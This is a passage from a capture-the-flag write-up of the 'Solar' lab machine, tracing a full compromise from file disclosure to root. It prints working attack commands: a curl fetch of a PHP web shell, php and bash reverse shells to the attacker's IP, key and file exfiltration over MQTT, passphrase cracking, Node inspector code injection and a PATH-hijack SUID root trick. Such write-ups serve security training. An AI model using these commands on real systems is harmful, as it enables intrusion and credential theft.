 ...
```

## LFI

At this point, a Python script can be developed to facilitate the LFI. We obtain different files using the steps described above.

The most interesting files we can retrieve from the web services (enumerated at the beginning with gobuster):

### /var/www/solar.nyx/login.php

Where we can obtain the database credentials, accessible only locally and from which we found a backup.

```php
<?php
include("session.php");

$servername = "127.0.0.1";
$username = "solar_user";
$password = "lD5vkvLfMowAiaT7w64C";
$dbname = "solar_energy_db";
....
```

### /var/www/sunfriends.nyx/server.php

Where we can obtain other highly interesting credentials `5up3r:bloods`, which grant us access to an administrative panel at `https://www.sunfriends.nyx/server.php` and can also be used to connect to the MQTT service with this user.

```php
<?php
$secure = true;
$httponly = true;
$samesite = 'Strict';
$secret = [
    'user' => '5up3r',
    'pass' => 'bloods'
];

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
...
```
![Admin Login](../../assets/images/solar/image-8.png)

## RCE

Analyzing the source code of `/var/www/sunfriends.nyx/server.php`, we observe that the user credentials are used for form validation and for connecting to the MQTT service.

![Server Administration Panel](../../assets/images/solar/image-10.png)

We access `https://www.sunfriends.nyx/server.php` with the obtained credentials `5up3r:bloods`, and we also connect to the MQTT server using the same credentials, subscribing to all topics `#`.

![MQTTX Config](../../assets/images/solar/image-5.png)

We can see that we receive all messages from the `data` and `record` topics, and when we execute a command, we also receive messages from the `server/command/output` topic.

![alt text](../../assets/images/solar/image-11.png)

We attempt to publish data to various topics such as `server/command/info`, `server/command/add`, `server/command/new`, ... and when we publish to **server/command/new**, we receive a message in the `server/command/error` topic that we did not send.

![command](../../assets/images/solar/image-28.png)

We add the **name** parameter to the JSON sent to the `server/command/new` topic.

![command2](../../assets/images/solar/image-29.png)

We also add the `cmd` parameter, and we no longer receive any errors.

In the `/server.php` code, we see that the command is filtered using PHP's `escapeshellcmd` function. According to the PHP manual, this function...

```text
The following characters are preceded by a backslash: #&;`|*?~<>^()[]{}$\, \x0A and \xFF. ' and " are only escaped if they are not matched.
```

We prepare a PHP file and start a service on port 8000.

```bash
echo '<?php echo(exec($_GET["cmd"])); ?>' > shell.php 
python3 -m http.server 8000
```

and we send the following payload to the `server/command/new` topic to upload the `shell.php` file (previously created) to the `/var/www/solar.nyx/records/` directory, as other directories don't work, and we noticed that a PHP script (`/var/www/solar.nyx/records/index.php`) deletes files in this directory.

```json
{
  "name": "upload-revshell",
  "cmd": "curl -o /var/www/solar.nyx/records/shell.php http://192.168.1.116:8000/shell.php"
}
```

We execute the `upload-revshell` command from the `https://www.sunfriends.nyx/server.php` page and observe that the prepared `shell.php` is downloaded.

```bash
nc -lvnp 12345
```

We send the following `revshell` through the URL-encoded `cmd` parameter.

```bash
php -r '$sock=fsockopen("192.168.1.116",12345);exec("/bin/bash <&3 >&3 2>&3");'
```

```
https://www.solar.nyx/records/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C12345%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

We now have a `shell` with `www-data`.

![alt text](../../assets/images/solar/image-13.png)

## www-data to Lenam

We handle the TTY setup.

```bash
$ cat /etc/passwd|grep sh  
root:x:0:0:root:/root:/bin/bash
lenam:x:1000:1000:,,,:/home/lenam:/bin/bash
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
julian:x:1001:1001::/home/julian:/bin/sh

$ cat /etc/doas.conf 
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

We can execute `mosquitto_pub` as the `lenam` user via `doas` without a password.

### Retrieving `user.txt` and `id_ed25519` from lenam

We find the flag at `/home/lenam/user.txt` and also some SSH keys. We subscribe to the `filtrate` topic on the MQTT client and execute the following commands.

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/user.txt
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.ssh/id_ed25519
```
![alt text](../../assets/images/solar/image-14.png)

The key is encrypted, and the `passphrase` is strong; it is not found in `rockyou.txt`.

### Retrieving the `passphrase` from lenam's `id_ed25519`

We create a file and a folder:

```bash
www-data@solar:/tmp$ ls -l
total 4
-rw-r--r-- 1 www-data www-data    0 Aug 27 17:12 file
drwxr-xr-x 2 www-data www-data 4096 Aug 27 17:11 folder
```

Using the `-f` parameter of `mosquitto_pub`, we can identify if a file does not exist:

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./filenoexist
Error: Unable to open file "./filenoexist".
Error loading input file "./filenoexist".
```

If the file exists (even when sending it to a `topic`):

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./file       
Error: Both topic and message must be supplied.
mosquitto_pub is a simple mqtt client that will publish a message on a single topic and exit.
mosquitto_pub version 2.0.11 running on libmosquitto 2.0.11.

Usage: mosquitto_pub {[-h host] [--unix path] [-p port] [-u username] [-P password] -t topic | -L URL}
                     {-f file | -l | -n | -m message}
                     [-c] [-k keepalive] [-q qos] [-r] [--repeat N] [--repeat-delay time] [-x session-expiry]
                     [-A bind_address] [--nodelay]
                     [-i id] [-I id_prefix]
                     [-d] [--quiet]
                     [-M max_inflight]
                     [-u username [-P password]]
                     [--will-topic [--will-payload payload] [--will-qos qos] [--will-retain]]
                     [{--cafile file | --capath dir} [--cert file] [--key file]
                       [--ciphers ciphers] [--insecure]
                       [--tls-alpn protocol]
                       [--tls-engine engine] [--keyform keyform] [--tls-engine-kpass-sha1]]
                       [--tls-use-os-certs]
                     [--psk hex-key --psk-identity identity [--ciphers ciphers]]
                     [--proxy socks-url]
                     [--property command identifier value]
                     [-D command identifier value]
       mosquitto_pub --help
      ...
```

Or if it is a directory:

```bash
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./folder
Error: File must be less than 268435455 bytes.

Error loading input file "./folder".

www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./filenoexist 2>&1 | wc -l
2
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./file 2>&1 | wc -l
97
www-data@solar:/tmp$ doas -u lenam /usr/bin/mosquitto_pub -f ./folder 2>&1 | wc -l
3
```

The system is Debian 12.

```bash
$ cat /etc/debian_version
12.7
```

We create a dictionary of the most common dotfiles in Debian from the URL https://wiki.debian.org/DotFilesList.

```bash
www-data@solar:/tmp$ curl https://wiki.debian.org/DotFilesList 2> /dev/null | grep -oP '(?<=\<tt class="backtick">).*?(?=</tt>)' | sort | uniq  > dotfiles.txt
```

and we check if there is any file from the list in lenam's home directory that we can access.

```bash
www-data@solar:/tmp$ cat ./dotfiles.txt | tr '\n' '\0' | xargs -0 -I {} -P 50 bash -c '
    result=$(doas -u lenam /usr/bin/mosquitto_pub -f "/home/lenam/.local/nano/{}" 2>&1 | wc -l)
    if [ "$result" -eq 3 ]; then
        echo "** Folder {} $(ls -dlah {} 2>/dev/null)"
    elif [ "$result" -eq 97 ]; then
        echo "** File {} $(ls -lah {} 2>/dev/null)"
    fi
'
** File .bash_logout 
** File .bash_history 
** File .bashrc 
** Folder .gnupg/ 
** File .lesshst 
** Folder .local/
** File .nanorc 
** File .ssh/authorized_keys
```

We found the `.gnupg/` and `.local/` directories, where we can run our improvised scanner again. We also used other dictionaries found online, modifying them as needed.

- https://github.com/bhavesh-pardhi/Wordlist-Hub/blob/main/WordLists/dotfiles.txt
- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 

We found the passphrase for lenam's `id_ed25519` key leaked in the nano editor's search history file at `/home/lenam/.local/share/nano/search_history`.

We sent it to the MQTT server:

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.local/share/nano/search_history
```

![Leaked Passphrase](../../assets/images/solar/image-15.png)

We logged in with lenam's SSH key and the passphrase `CzMO48xpwof8nvQ6JUhF` via SSH.

![SSH Lenam](../../assets/images/solar/image-16.png)

## From lenam to julian

The user lenam can kill processes as the user julian using their password, which we do not have.

```bash
lenam@solar:~$ cat /etc/doas.conf 
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

We found the `/home/lenam/.password-store` directory where `pass`, a password manager, typically stores passwords.

![pass test](../../assets/images/solar/image-17.png)

We can see that lenam uses it and has several stored passwords. We cannot view them because a passphrase is required. The passphrase we used for the SSH key does not work. Normally, this software uses a GPG key to secure the vault.

We found 2 GPG keys in the `/home/lenam/.gnupg/private-keys-v1.d/` directory.

![alt text](../../assets/images/solar/image-18.png)

### Cracking GPG 2.2

```bash
lenam@solar:~$ gpg --version
gpg (GnuPG) 2.2.40
libgcrypt 1.10.1
Copyright (C) 2022 g10 Code GmbH
License GNU GPL-3.0-or-later <https://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: /home/lenam/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2

lenam@solar:~$ pass
Password Store
├── personal
│   ├── private_id
│   └── user
└── work
    └── office
``` 

We find GPG version 2.2 with GnuPG, where the new file format is incompatible with `hashcat`, `john`, or `gpg2john`. We are unable or do not know how to export it to an older version without having the private GPG key passphrase.

```bash
lenam@solar:~$ find .password-store/
.password-store/
.password-store/.gpg-id
.password-store/personal
.password-store/personal/user.gpg
.password-store/personal/private_id.gpg
.password-store/work
.password-store/work/office.gpg
lenam@solar:~$ find .gnupg/
.gnupg/
.gnupg/pubring.kbx
.gnupg/random_seed
.gnupg/gpg-agent.conf
.gnupg/trustdb.gpg
.gnupg/.#lk0x000055afe4c8a3f0.solar.309336
.gnupg/openpgp-revocs.d
.gnupg/openpgp-revocs.d/E6DB2B029F01725397A555CD6CE6C909C038D50C.rev
.gnupg/pubring.kbx~
.gnupg/private-keys-v1.d
.gnupg/private-keys-v1.d/C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95.key
.gnupg/private-keys-v1.d/18DB29FBB15652340964CF0E1C710F34AA848ADD.key
```

We find two private key files and various encrypted passwords managed by the `pass` password manager and stored in `.password-store`.

```bash
lenam@solar:~$ gpg --list-keys --with-keygrip
/home/lenam/.gnupg/pubring.kbx
------------------------------
pub   rsa3072 2024-08-29 [SC]
      E6DB2B029F01725397A555CD6CE6C909C038D50C
      Keygrip = 18DB29FBB15652340964CF0E1C710F34AA848ADD
uid           [ultimate] secret <lenam@solar.nyx>
sub   rsa3072 2024-08-29 [E]
      Keygrip = C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95

lenam@solar:~$ gpg --list-secret-keys --with-keygrip
/home/lenam/.gnupg/pubring.kbx
------------------------------
sec   rsa3072 2024-08-29 [SC]
      E6DB2B029F01725397A555CD6CE6C909C038D50C
      Keygrip = 18DB29FBB15652340964CF0E1C710F34AA848ADD
uid           [ultimate] secret <lenam@solar.nyx>
ssb   rsa3072 2024-08-29 [E]
      Keygrip = C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95

lenam@solar:~$ gpgconf --list-components
gpg:OpenPGP:/usr/bin/gpg
gpgsm:S/MIME:/usr/bin/gpgsm
gpg-agent:Private Keys:/usr/bin/gpg-agent
scdaemon:Smartcards:/usr/lib/gnupg/scdaemon
dirmngr:Network:/usr/bin/dirmngr
pinentry:Passphrase Entry:/usr/bin/pinentry
```

We see a GPG key belonging to the user "secret" with the email lenam@solar.nyx. The primary key is used for signing and certifying [SC], while the subkey is used for encrypting [E] data. Both keys never expire. The key's fingerprint is `E6DB2B029F01725397A555CD6CE6C909C038D50C`.

The 3072-bit RSA encryption is very strong and would be difficult to crack via brute force.

We also found a file with a note.

```bash
lenam@solar:~$ cat note.txt 
You just have to remember the one that starts with love and ends with a number.
```

We copied the `.gnupg` directories to the home directory on our machine (Be careful if you already have these folders; make a backup first to avoid losing your GPG keys) and also copied the `.password-store` folder.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ scp -ri id_ed25519_lenam lenam@192.168.1.168:~/.password-store .
Enter passphrase for key 'id_ed25519_lenam': 
.gpg-id                                                  100%    7     1.8KB/s   00:00    
user.gpg                                                 100%  471   168.5KB/s   00:00    
private_id.gpg                                           100%  471    93.7KB/s   00:00    
office.gpg                                               100%  463   108.3KB/s   00:00    
                                                                                           
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ scp -ri id_ed25519_lenam lenam@192.168.1.168:~/.gnupg ~/         
Enter passphrase for key 'id_ed25519_lenam': 
tofu.db                                                  100%   48KB   6.9MB/s   00:00    
pubring.kbx                                              100% 1954   562.6KB/s   00:00    
random_seed                                              100%  600   154.7KB/s   00:00    
gpg-agent.conf                                           100%   36     9.3KB/s   00:00    
trustdb.gpg                                              100% 1280   442.1KB/s   00:00    
.#lk0x

000055afe4c8a3f0.solar.309336                      100%   17     5.5KB/s   00:00    
E6DB2B029F01725397A555CD6CE6C909C038D50C.rev             100% 1626   528.3KB/s   00:00    
pubring.kbx~                                             100% 1960   713.3KB/s   00:00    
C622C75FED7EF077FDE1AB4D6A1F5D37E4896A95.key             100% 3105     1.9MB/s   00:00    
18DB29FBB15652340964CF0E1C710F34AA848ADD.key             100% 3105     1.7MB/s   00:00
```

Using `rockyou` and filtering passwords that start with "love" and end with a number, we attempt to find the passphrase used to encrypt the GPG key with the following bash script.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ time grep -E '^love.*[0-9]$' /usr/share/wordlists/rockyou.txt | xargs -P 4 -I {} sh -c 'echo "Testing passphrase: {} ..."; gpg --batch --yes --passphrase "{}" --pinentry-mode loopback --decrypt .password-store/work/office.gpg 2>/dev/null && echo "** Passphrase found: {}" && killall xargs'
Testing passphrase: love123 ...
Testing passphrase: love12 ...
Testing passphrase: loveme1 ...
Testing passphrase: lovely1 ...
Testing passphrase: lover1 ...
...
Testing passphrase: love27 ...
Testing passphrase: lovers2 ...
Testing passphrase: loverboy1 ...
Testing passphrase: love55 ...
Testing passphrase: love77 ...
Testing passphrase: love45 ...
d1NpIh1bCKMx
** Passphrase found: loverboy1
zsh: broken pipe  grep --color=auto -E '^love.*[0-9]$' /usr/share/wordlists/rockyou.txt | 
zsh: terminated   xargs -P 4 -I {} sh -c 

real    21,11s
user    0,05s
sys     0,00s
cpu     0%

real    21,11s
user    0,16s
sys     0,02s
cpu     0%
```

In about 21 seconds, we find the GPG key passphrase `loverboy1` and the decrypted data from `.password-store/work/office.gpg` as `d1NpIh1bCKMx`, although this password won't be needed. We can now view the rest of the passwords in the `pass` manager.

### Node

Now that we have the passphrase (`loverboy1`) for the manager, we can access all passwords.

```bash
lenam@solar:~$ pass
Password Store
├── personal
│   ├── private_id
│   └── user
└── work
    └── office
lenam@solar:~$ pass personal/private_id
CzMO48xpwof8nvQ6JUhF
lenam@solar:~$ pass personal/user
qiFQI7buDp7zIQnAymEY
lenam@solar:~$ pass work/office
d1NpIh1bCKMx
```

The `personal/private_id` password is the passphrase for the SSH key we already have; `personal/user` is the password for the `lenam` user, needed for running `doas`. The last password `work/office` won't be necessary.

Now that we have `lenam`'s password, we can kill processes as the `julian` user using `doas`.

```text
permit lenam as julian cmd /bin/kill
```

We search for processes running under the `julian` user.

```bash
lenam@solar:~$ ps aux | grep julian
julian    549542  3.2  3.9 1053996 79168 ?       Ssl  05:11   0:00 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
julian    549553  5.0  8.8 34100228 179060 ?     Ssl  05:11   0:00 /home/julian/.cache/puppeteer/chrome/linux-126.0.6478.126/chrome-linux64/chrome --allow-pre-commit-input --disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-hang-monitor --disable-infobars --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --disable-search-engine-choice-screen --disable-sync --enable-automation --export-tagged-pdf --generate-pdf-document-outline --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints,ProcessPerSiteUpToMainFrameThreshold,IsolateSandboxedIframes --enable-features=PdfOopif --headless=new --hide-scrollbars --mute-audio about:blank --ignore-certificate-errors --remote-debugging-port=0 --user-data-dir=/tmp/puppeteer_dev_chrome_profile-W1SxUQ
...
```

We find a `nodejs` process. This process restarts every 2 minutes, changing its PID.

We can try killing the process by sending a `SIGUSR1` signal, which will restart the `nodejs` process with the inspector port open by default on port `9229`.

We check if we can run the `nodejs` binary on the server and if we have execution permissions.

```bash
lenam@solar:~$ /home/julian/.nvm/versions/node/v22.7.0/bin/node --version
v22.7.0
```

We kill the process and then try accessing the `nodejs` inspector.

```bash
lenam@solar:~$ doas -u julian /bin/kill -s SIGUSR1 $(pgrep "node") && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
doas (lenam@solar) password: 
connecting to localhost:9229 ... ok
debug> 
```

We can access the inspector and send commands to the application's process using `exec()`. This will work for a while until the process is restarted (approximately every 2 minutes); after that, we need to exit the inspector with `.exit`.

We listen with `netcat` on our machine.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ nc -lvnp 5000 
listening on [any] 5000 ...
```

On the server, we run the previous command to enter the `nodejs` inspector.

```bash
lenam@solar:~$ doas -u julian /bin/kill -s SIGUSR1 $(pgrep "node") && /home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
doas (lenam@solar) password: 
connecting to localhost:9229 ... ok
debug> 
```

Quickly, without waiting too long, we enter in the debugger:

```javascript
debug> exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/192.168.1.116/5000 0>&1\"')")
```

We obtain a `revshell` with the `julian` user.

![revshell julian](../../assets/images/solar/image-19.png)

## From julian to root

We handle the TTY setup.

```bash
julian@solar:/$ cat /etc/doas.conf 
permit nopass www-data as lenam cmd /usr/bin/mosquitto_pub
permit lenam as julian cmd /bin/kill
permit setenv { PATH } julian as root cmd /usr/local/bin/backups

```

The `julian` user can execute the `/usr/local/bin/backups` binary as `root`, preserving the `PATH` environment variable, but we need the user's password.

### julian's Password

We find a JPG image in the user's directory. We transfer it to our machine using `curl` and the Python `uploadserver` module.

![uploadserver](../../assets/images/solar/image-20.png)

With `stegcracker` and `rockyou.txt`, we discover the password `teresa` within a few seconds and extract the information.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ stegcracker my-pass.jpg /usr/share/wordlists/rockyou.txt 
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2024 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'my-pass.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: teresa
Tried 851 passwords
Your file has been written to: my-pass.jpg.out
teresa
                                                                                                  
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ cat my-pass.jpg.out
Password programmed

D'`r^9K=m54z8ywSeQcPq`M',+lZ(XhCC{@b~}<*)Lrq7utmrqji/mfN+ihgfe^F\"C_^]\[Tx;WPOTMqp3INGLKDhHA@d'CB;:9]=<;:3y76/S321q/.-,%Ij"'&}C{c!x>|^zyr8vuWmrqjoh.fkjchgf_^$\[ZY}W\UTx;WPOTSLp3INMLEJCg*@dDC%A@?8\}5Yzy1054-,P*)('&J$)(!~}C{zy~w=^zsxwpun4rqjih.leMiba`&^F\"CB^]Vzg

```

The phrase `Password programmed` appears, followed by:

```text
D'`r^9K=m54z8ywSeQcPq`M',+lZ(XhCC{@b~}<*)Lrq7utmrqji/mfN+ihgfe^F\"C_^]\[Tx;WPOTMqp3INGLKDhHA@d'CB;:9]=<;:3y76/S321q/.-,%Ij"'&}C{c!x>|^zyr8vuWmrqjoh.fkjchgf_^$\[ZY}W\UTx;WPOTSLp3INMLEJCg*@dDC%A@?8\}5Yzy1054-,P*)('&J$)(!~}C{zy~w=^zsxwpun4rqjih.leMiba`&^F\"CB^]Vzg
```

Looking into obscure programming languages, we identify `Malbolge`, an intentionally difficult language designed by its creator.

There are various websites where we can execute `Malbolge` code online; we used:

https://malbolge.doleczek.pl/

We copied the `Malbolge` code from the image and ran it.

![julian password](../../assets/images/solar/image-21.png)

We find `julian`'s password: `tk8QaHUi3XaMLYoP1BpZ`.

```bash
julian@solar:~$ doas /usr/local/bin/backups
doas (julian@solar) password: 
Usage: /usr/local/bin/backups <database_name>
julian@solar:~$ 
```

### Binary backups

We analyze the `/usr/local/bin/backups` binary, which we can now run as the `root` user.

```bash
julian@solar:~$ doas /usr/local/bin/backups
doas (julian@solar) password: 
Usage: /usr/local/bin/backups <database_name>

julian@solar:~$ doas /usr/local/bin/backups test
doas (julian@solar) password: 
mysqldump: Got error: 1049: "Unknown database 'test'" when selecting the database
Error executing mysqldump and gzip. Exit code: 512

julian@solar:~$ doas /usr/local/bin/backups --help
doas (julian@solar) password: 
Invalid database name. Ensure it contains only letters, numbers, and underscores, and is between 1 and 64 characters long.

julian@solar:~$ doas /usr/local/bin/backups solar_energy_db
doas (julian@solar) password: 
Backup completed successfully: /var/www/sunfriends.nyx/database.sql.gz

```

This seems to be a binary responsible for creating the backup we found at the beginning of this writeup. It does not appear vulnerable to buffer overflow. We check if it uses libraries we could hijack with `ldd`.

```bash
julian@solar:~$ ldd /usr/local/bin/backups
        linux-vdso.so.1 (0x00007ffe26ffc000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1665b82000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1665d71000)
```

```bash
julian@solar:~$ readelf -d /usr/local/bin/backups

Dynamic section at offset 0x2de0 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x14f0
 0x0000000000000019 (INIT_ARRAY)         0x3dd0
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dd8
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x560
 0x0000000000000006 (SYMTAB)             0x3c8
 0x000000000000000a (STRSZ)              244 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fe8
 0x0000000000000002 (PLTRELSZ)           240 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x7a0
 0x0000000000000007 (RELA)               0x6c8
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffffe (VERNEED)            0x678
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x654
 0x000000006ffffff9 (RELACOUNT)          3
 0x0000000000000000 (NULL)               0x0
```

We use `strings` to understand more.

```bash
julian@solar:~$ strings /usr/local/bin/backups
/lib64/ld-linux-x86-64.so.2
dlclose
strlen
__ctype_b_loc
__libc_start_main
stderr
fprintf
dlsym
dlopen
__cxa_finalize
dlerror
__isoc99_sscanf
fwrite
libc.so.6
GLIBC_2.3
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
%2hhx
Usage: %s <database_name>
Invalid database name. Ensure it contains only letters, numbers, and underscores, and is between 1 and 64 characters long.
/var/www/sunfriends.nyx/database.sql.gz
05000b0b080a021c19471a06
Error loading library.
0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19
Error finding symbol.
Backup completed successfully: %s

...
```

We observe `dlclose`, `dlopen`, etc., which are used for loading dynamic libraries. We also find two suspicious texts for dynamically loading libraries, preceded by hexadecimal codes.

```text
05000b0b080a021c19471a06
Error loading library.
0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19
Error finding symbol.
```

We use [CyberChef](https://gchq.github.io/CyberChef/) and apply the `Magic` recipe, enabling `Intensive mode` and `Extensive language support`. We paste the first code `05000b0b080a021c19471a06`.

After some processing, CyberChef decodes it as hexadecimal followed by XOR with key `69`.

![CyberChef 1](../../assets/images/solar/image-22.png)

It reveals the name of a library `libbackup.so`. We do the same for the longer code `0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19`, encoded similarly with the same XOR key.

![CyberChef 2](../../assets/images/solar/image-23.png)

We find the library name `libbackup.so` and what seems to be a function name `create_compressed_backup`.

We could transfer the file to our machine and use `uftrace`, but this seems unnecessary.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/SOLAR/test]
└─$ uftrace --force -a ./backups sdfadsf
Error loading library.
# DURATION     TID     FUNCTION
 253.995 us [ 83414] | strlen("sdfadsf") = 7;
   1.042 us [ 83414] | strlen("sdfadsf") = 7;
   1.884 us [ 83414] | __ctype_b_loc();
   0.872 us [ 83414] | strlen("sdfadsf") = 7;
   0.988 us [ 83414] | __ctype_b_loc();
   0.962 us [ 83414] | strlen("sdfadsf") = 7;
   0.750 us [ 83414] | __ctype_b_loc();
   0.819 us [ 83414] | strlen("sdfadsf") = 7;
   0.759 us [ 83414] | __ctype_b_loc();
   0.785 us [ 83414] | strlen("sdfadsf") = 7;
   0.737 us [ 83414] | __ctype_b_loc();
   0.802 us [ 83414] | strlen("sdfadsf") = 7;
   0.

985 us [ 83414] | __ctype_b_loc();
   0.941 us [ 83414] | strlen("sdfadsf") = 7;
   0.764 us [ 83414] | __ctype_b_loc();
   0.810 us [ 83414] | strlen("sdfadsf") = 7;
   4.189 us [ 83414] | strlen("05000b0b080a021c19471a06") = 24;
   4.163 us [ 83414] | __isoc99_sscanf();
   1.004 us [ 83414] | __isoc99_sscanf();
   1.121 us [ 83414] | __isoc99_sscanf();
   1.130 us [ 83414] | __isoc99_sscanf();
   1.054 us [ 83414] | __isoc99_sscanf();
   0.915 us [ 83414] | __is

oc99_sscanf();
   0.935 us [ 83414] | __isoc99_sscanf();
   0.968 us [ 83414] | __isoc99_sscanf();
   0.930 us [ 83414] | __isoc99_sscanf();
   0.905 us [ 83414] | __isoc99_sscanf();
   1.071 us [ 83414] | __isoc99_sscanf();
   1.349 us [ 83414] | __isoc99_sscanf();
   1.590 ms [ 83414] | dlopen("libbackup.so", RTLD_LAZY) = 0;
  35.739 us [ 83414] | fwrite(0x55bd23f3e0f1, 1, 23, &_IO_2_1_stderr_) = 23;
```

We search for the `libbackup.so` library.

```bash
julian@solar:~$ find / -name libbackup.so 2>/dev/null
/usr/lib/x86_64-linux-gnu/libbackup.so

julian@solar:~$ strings /usr/lib/x86_64-linux-gnu/libbackup.so
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
create_compressed_backup
snprintf
system
stderr
fprintf
libc.so.6
GLIBC_2.2.5
u+UH
/usr/bin/mysqldump --databases %s > /tmp/temp.sql && /usr/bin/gzip /tmp/temp.sql -c > %s && rm /tmp/temp.sql
Error executing mysqldump and gzip. Exit code: %d
...
```

We find the error messages shown when entering a non-existent database and what seems to be the command executed in the code.

```bash
/usr/bin/mysqldump --databases %s > /tmp/temp.sql && /usr/bin/gzip /tmp/temp.sql -c > %s && rm /tmp/temp.sql
```

Since we can use our `PATH` environment variable while executing the `backups` binary, which uses the `libbackup.so` library, we can exploit this to escalate privileges.

`julian`'s `PATH` already contains writable directories.

```bash
julian@solar:~$ echo $PATH
/home/julian/.nvm/versions/node/v22.7.0/bin:/home/julian/.local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

We create an executable `rm` file; it is the only binary executed without an absolute path in `libbackup.so`.

```bash
julian@solar:~$ nano .local/bin/rm

julian@solar:~$ cat .local/bin/rm
#!/bin/bash

cp /bin/bash /tmp/
chmod u+s /tmp/bash

julian@solar:~$ chmod +x .local/bin/rm
```

We run the `backups` binary with `doas` using `julian`'s password and an existing database name. This last step is crucial; otherwise, the `rm` command will not be executed.

```bash
julian@solar:~$ doas /usr/local/bin/backups solar_energy_db
doas (julian@solar) password: 
Backup completed successfully: /var/www/sunfriends.nyx/database.sql.gz

julian@solar:~$ ls -la /tmp/bash 
-rwsr-xr-x 1 root root 1265648 sep  4 22:08 /tmp/bash
```

Using the `bash` binary with SUID, we can access the root shell and read the flag.

```bash
julian@solar:~$ /tmp/bash -p

